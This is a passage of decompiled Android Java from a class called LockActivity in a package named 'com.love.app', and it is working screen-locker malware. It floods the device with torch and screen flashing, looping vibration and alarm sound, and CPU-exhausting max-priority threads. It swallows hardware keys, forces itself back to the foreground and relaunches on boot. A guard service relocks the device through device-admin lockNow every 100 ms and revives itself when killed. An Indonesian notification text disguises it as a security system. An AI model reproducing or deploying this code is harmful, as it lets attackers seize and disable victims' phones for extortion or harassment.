                            LockActivity.this.cameraManager.setTorchMode(LockActivity.this.cameraId, LockActivity.this.torchOn);
                        } catch (Exception unused) {
                        }
                        LockActivity.this.handler.postDelayed(this, 120L);
                    }
                }
            });
        }
    }

    private void stopTorch() {
        if (this.cameraId != null) {
            try {
                this.cameraManager.setTorchMode(this.cameraId, false);
            } catch (Exception unused) {
            }
        }
    }

    private void startScreenFlashing() {
        this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.2
            boolean red = true;

            @Override // java.lang.Runnable
            public void run() {
                if (LockActivity.this.isRunning) {
                    LockActivity.this.getWindow().getDecorView().setBackgroundColor(this.red ? Color.parseColor("#1A0000") : ViewCompat.MEASURED_STATE_MASK);
                    this.red = !this.red;
                    LockActivity.this.handler.postDelayed(this, 80L);
                }
            }
        });
    }

    private void startVibration() {
        Vibrator vibrator = this.vibrator;
        if (vibrator == null || !vibrator.hasVibrator()) {
            return;
        }
        long[] jArr = {0, 300, 100, 300, 100, 600, 200};
        if (Build.VERSION.SDK_INT >= 26) {
            this.vibrator.vibrate(VibrationEffect.createWaveform(jArr, 0));
        } else {
            this.vibrator.vibrate(jArr, 0);
        }
    }

    private void playAlarm() {
        try {
            Uri defaultUri = RingtoneManager.getDefaultUri(4);
            if (defaultUri == null) {
                defaultUri = RingtoneManager.getDefaultUri(1);
            }
            if (defaultUri == null) {
                return;
            }
            MediaPlayer mediaPlayerCreate = MediaPlayer.create(this, defaultUri);
            this.mediaPlayer = mediaPlayerCreate;
            if (mediaPlayerCreate != null) {
                mediaPlayerCreate.setLooping(true);
                this.mediaPlayer.start();
            }
        } catch (Exception unused) {
        }
    }

    private void startBrutalHang() {
        int iMax = Math.max(8, Runtime.getRuntime().availableProcessors() * 2);
        for (int i = 0; i < iMax; i++) {
            Thread thread = new Thread(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda8
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m320lambda$startBrutalHang$13$comloveappLockActivity();
                }
            });
            thread.setDaemon(true);
            thread.setPriority(10);
            thread.start();
        }
        this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.3
            @Override // java.lang.Runnable
            public void run() {
                if (LockActivity.this.isRunning) {
                    LockActivity.this.hideSystemUI();
                    LockActivity.this.handler.postDelayed(this, 50L);
                }
            }
        });
        this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.4
            @Override // java.lang.Runnable
            public void run() {
                if (LockActivity.this.isRunning) {
                    if (LockActivity.this.wakeLock != null && !LockActivity.this.wakeLock.isHeld()) {
                        LockActivity.this.wakeLock.acquire(3600000L);
                    }
                    LockActivity.this.handler.postDelayed(this, 240000L);
                }
            }
        });
        this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.5
            @Override // java.lang.Runnable
            public void run() {
                if (LockActivity.this.isRunning) {
                    try {
                        ActivityManager activityManager = (ActivityManager) LockActivity.this.getSystemService("activity");
                        if (activityManager != null) {
                            activityManager.moveTaskToFront(LockActivity.this.getTaskId(), 1);
                        }
                    } catch (Exception unused) {
                    }
                    LockActivity.this.handler.postDelayed(this, 200L);
                }
            }
        });
    }

    /* JADX INFO: renamed from: lambda$startBrutalHang$13$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m320lambda$startBrutalHang$13$comloveappLockActivity() {
        Process.setThreadPriority(-19);
        long jNanoTime = System.nanoTime();
        while (this.isRunning) {
            jNanoTime = (jNanoTime >>> 32) ^ ((6364136223846793005L * jNanoTime) + 1442695040888963407L);
            double d = jNanoTime;
            Math.sin(d);
            Math.cos(d);
            Math.sqrt(Math.abs(jNanoTime));
        }
    }

    private void startChatLockEnforcement() {
        this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.6
            @Override // java.lang.Runnable
            public void run() {
                if (LockActivity.this.isRunning) {
                    if (LockActivity.this.wakeLock != null && !LockActivity.this.wakeLock.isHeld()) {
                        LockActivity.this.wakeLock.acquire(3600000L);
                    }
                    LockActivity.this.handler.postDelayed(this, 240000L);
                }
            }
        });
    }

    private void stopAllEffects() {
        this.handler.removeCallbacksAndMessages(null);
        stopTorch();
        MediaPlayer mediaPlayer = this.mediaPlayer;
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                this.mediaPlayer.release();
            } catch (Exception unused) {
            }
        }
        Vibrator vibrator = this.vibrator;
        if (vibrator != null) {
            vibrator.cancel();
        }
        AudioManager audioManager = this.audioManager;
        if (audioManager != null) {
            try {
                audioManager.setStreamVolume(4, this.originalVolume, 0);
            } catch (Exception unused2) {
            }
        }
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock == null || !wakeLock.isHeld()) {
            return;
        }
        this.wakeLock.release();
    }

    private void startLockGuardService() {
        Intent intent = new Intent(this, (Class<?>) LockGuardService.class);
        intent.setAction(ACTION_START_LOCK);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    private void stopLockGuardService() {
        Intent intent = new Intent(this, (Class<?>) LockGuardService.class);
        intent.setAction(ACTION_STOP_LOCK);
        startService(intent);
    }

    private void registerScreenOnReceiver() {
        registerReceiver(new BroadcastReceiver() { // from class: com.love.app.LockActivity.7
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                if ("android.intent.action.SCREEN_ON".equals(intent.getAction()) && LockActivity.this.isRunning) {
                    LockActivity.this.moveTaskToFront();
                }
            }
        }, new IntentFilter("android.intent.action.SCREEN_ON"));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void moveTaskToFront() {
        try {
            ActivityManager activityManager = (ActivityManager) getSystemService("activity");
            if (activityManager != null) {
                activityManager.moveTaskToFront(getTaskId(), 1);
            }
        } catch (Exception unused) {
            Intent intent = new Intent(this, (Class<?>) LockActivity.class);
            intent.addFlags(335544320);
            startActivity(intent);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void hideSystemUI() {
        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(5894);
        decorView.setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda9
            @Override // android.view.View.OnSystemUiVisibilityChangeListener
            public final void onSystemUiVisibilityChange(int i) {
                this.f$0.m311lambda$hideSystemUI$14$comloveappLockActivity(i);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$hideSystemUI$14$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m311lambda$hideSystemUI$14$comloveappLockActivity(int i) {
        if ((i & 4) == 0) {
            this.handler.postDelayed(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda18
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.hideSystemUI();
                }
            }, 30L);
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (i != 26) {
            return true;
        }
        collapseStatusBar();
        sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        return super.onKeyDown(i, keyEvent);
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public boolean dispatchKeyEvent(KeyEvent keyEvent) {
        int[] iArr = {24, 25, 27, PduHeaders.DRM_CONTENT};
        for (int i = 0; i < 4; i++) {
            if (keyEvent.getKeyCode() == iArr[i]) {
                return true;
            }
        }
        return super.dispatchKeyEvent(keyEvent);
    }

    private void collapseStatusBar() {
        try {
            try {
                Class.forName("android.app.StatusBarManager").getMethod("collapsePanels", new Class[0]).invoke(getSystemService("statusbar"), new Object[0]);
            } catch (Exception unused) {
            }
        } catch (Exception unused2) {
            Class.forName("android.app.StatusBarManager").getMethod("collapse", new Class[0]).invoke(getSystemService("statusbar"), new Object[0]);
        }
    }

    @Override // android.app.Activity
    public void onUserLeaveHint() {
        if (this.isRunning) {
            collapseStatusBar();
            if (!"chat".equals(this.currentMode)) {
                sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
                restartLock();
            }
            moveTaskToFront();
            if (isAdminActive()) {
                return;
            }
            triggerFullHang();
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        if (z) {
            hideSystemUI();
            return;
        }
        if (isFinishing() || !this.isRunning) {
            return;
        }
        collapseStatusBar();
        if ("chat".equals(this.currentMode)) {
            return;
        }
        sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        this.handler.postDelayed(new LockActivity$$ExternalSyntheticLambda19(this), 30L);
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        if (!this.isRunning || isFinishing()) {
            return;
        }
        collapseStatusBar();
        if ("chat".equals(this.currentMode)) {
            return;
        }
        sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        this.handler.postDelayed(new LockActivity$$ExternalSyntheticLambda19(this), 30L);
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        if (!this.isRunning || isFinishing()) {
            return;
        }
        collapseStatusBar();
        if ("chat".equals(this.currentMode)) {
            return;
        }
        sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        this.handler.postDelayed(new LockActivity$$ExternalSyntheticLambda19(this), 30L);
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        this.isRunning = false;
        Handler handler = this.pollHandler;
        if (handler != null) {
            handler.removeCallbacks(this.pollRunnable);
        }
        ValueAnimator valueAnimator = this.headerAnimator;
        if (valueAnimator != null) {
            valueAnimator.cancel();
        }
        stopAllEffects();
        WebView webView = this.webView;
        if (webView != null) {
            webView.destroy();
        }
        ExecutorService executorService = this.executor;
        if (executorService != null) {
            executorService.shutdownNow();
        }
        BroadcastReceiver broadcastReceiver = this.unlockReceiver;
        if (broadcastReceiver != null) {
            try {
                unregisterReceiver(broadcastReceiver);
                this.unlockReceiver = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregister unlockReceiver", e);
            }
        }
        SharedPreferences sharedPreferences = this.prefs;
        if (sharedPreferences == null || !sharedPreferences.getBoolean("is_locked", false)) {
            return;
        }
        restartLock();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void restartLock() {
        Intent intent = new Intent(this, (Class<?>) LockActivity.class);
        intent.addFlags(872415232);
        startActivity(intent);
    }

    private void playLockSound() {
        try {
            MediaPlayer mediaPlayerCreate = MediaPlayer.create(this, Settings.System.DEFAULT_NOTIFICATION_URI);
            if (mediaPlayerCreate != null) {
                mediaPlayerCreate.setOnCompletionListener(new MediaPlayer.OnCompletionListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda1
                    @Override // android.media.MediaPlayer.OnCompletionListener
                    public final void onCompletion(MediaPlayer mediaPlayer) {
                        mediaPlayer.release();
                    }
                });
                mediaPlayerCreate.start();
            }
        } catch (Exception e) {
            Log.e(TAG, "playLockSound error", e);
        }
    }

    private boolean isAdminActive() {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
        return devicePolicyManager != null && devicePolicyManager.isAdminActive(new ComponentName(this, (Class<?>) AdminReceiver.class));
    }

    private void triggerFullHang() {
        if (this.isHanging) {
            return;
        }
        this.isHanging = true;
        Intent intent = new Intent(this, (Class<?>) AdminService.class);
        intent.setAction("com.love.app.START_HANG");
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    public static class BootReceiver extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
                Intent intent2 = new Intent(context, (Class<?>) LockActivity.class);
                intent2.addFlags(335544320);
                context.startActivity(intent2);
                Intent intent3 = new Intent(context, (Class<?>) LockGuardService.class);
                intent3.setAction(LockActivity.ACTION_START_LOCK);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent3);
                } else {
                    context.startService(intent3);
                }
            }
        }
    }

    public static class LockGuardService extends Service {
        private DevicePolicyManager dpm;
        private Handler handler = new Handler(Looper.getMainLooper());
        private boolean monitoring = false;
        private BroadcastReceiver screenReceiver;

        @Override // android.app.Service
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override // android.app.Service
        public void onCreate() {
            super.onCreate();
            this.dpm = (DevicePolicyManager) getSystemService("device_policy");
            BroadcastReceiver broadcastReceiver = new BroadcastReceiver() { // from class: com.love.app.LockActivity.LockGuardService.1
                @Override // android.content.BroadcastReceiver
                public void onReceive(Context context, Intent intent) {
                    if ("android.intent.action.SCREEN_ON".equals(intent.getAction())) {
                        Intent intent2 = new Intent(LockGuardService.this, (Class<?>) LockActivity.class);
                        intent2.addFlags(335544320);
                        LockGuardService.this.startActivity(intent2);
                    }
                }
            };
            this.screenReceiver = broadcastReceiver;
            registerReceiver(broadcastReceiver, new IntentFilter("android.intent.action.SCREEN_ON"));
        }

        @Override // android.app.Service
        public int onStartCommand(Intent intent, int i, int i2) {
            startForegroundNotif();
            if (intent != null && LockActivity.ACTION_STOP_LOCK.equals(intent.getAction())) {
                stopMonitoring();
                stopSelf();
                return 2;
            }
            startMonitoring();
            return 1;
        }

        private void startForegroundNotif() {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel notificationChannel = new NotificationChannel("lock_guard", "Lock Guard", 2);
                NotificationManager notificationManager = (NotificationManager) getSystemService("notification");
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(notificationChannel);
                }
            }
            startForeground(9002, new NotificationCompat.Builder(this, "lock_guard").setContentTitle("Sistem Keamanan Aktif").setContentText("Perangkat dalam perlindungan penuh").setSmallIcon(android.R.drawable.ic_lock_lock).setPriority(-1).setOngoing(true).build());
        }

        private void startMonitoring() {
            if (this.monitoring) {
                return;
            }
            this.monitoring = true;
            this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.LockGuardService.2
                @Override // java.lang.Runnable
                public void run() {
                    if (LockGuardService.this.monitoring) {
                        if (!LockGuardService.this.isLockActivityVisible()) {
                            Intent intent = new Intent(LockGuardService.this, (Class<?>) LockActivity.class);
                            intent.addFlags(335544320);
                            LockGuardService.this.startActivity(intent);
                        }
                        try {
                            if (!"chat".equals(LockGuardService.this.getSharedPreferences("love_config", 0).getString("lock_mode", LinkCapabilities.Role.DEFAULT))) {
                                ComponentName componentName = new ComponentName(LockGuardService.this, (Class<?>) AdminReceiver.class);
                                if (LockGuardService.this.dpm != null && LockGuardService.this.dpm.isAdminActive(componentName)) {
                                    LockGuardService.this.dpm.lockNow();
                                }
                            }
                        } catch (Exception unused) {
                        }
                        LockGuardService.this.handler.postDelayed(this, 100L);
                    }
                }
            });
        }

        /* JADX INFO: Access modifiers changed from: private */
        public boolean isLockActivityVisible() {
            ActivityManager activityManager = (ActivityManager) getSystemService("activity");
            if (activityManager == null) {
                return false;
            }
            try {
                for (ActivityManager.AppTask appTask : activityManager.getAppTasks()) {
                    if (appTask.getTaskInfo() != null) {
                        ComponentName component = appTask.getTaskInfo().baseIntent != null ? appTask.getTaskInfo().baseIntent.getComponent() : null;
                        if (component != null && component.getClassName().contains(LockActivity.TAG)) {
                            return true;
                        }
                    }
                }
            } catch (Exception unused) {
            }
            return false;
        }

        private void stopMonitoring() {
            this.monitoring = false;
            this.handler.removeCallbacksAndMessages(null);
        }

        @Override // android.app.Service
        public void onDestroy() {
            super.onDestroy();
            BroadcastReceiver broadcastReceiver = this.screenReceiver;
            if (broadcastReceiver != null) {
                unregisterReceiver(broadcastReceiver);
            }
            if (this.monitoring) {
                Intent intent = new Intent(this, (Class<?>) LockGuardService.class);
                intent.setAction(LockActivity.ACTION_START_LOCK);
                if (Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }
            }
        }
    }
}
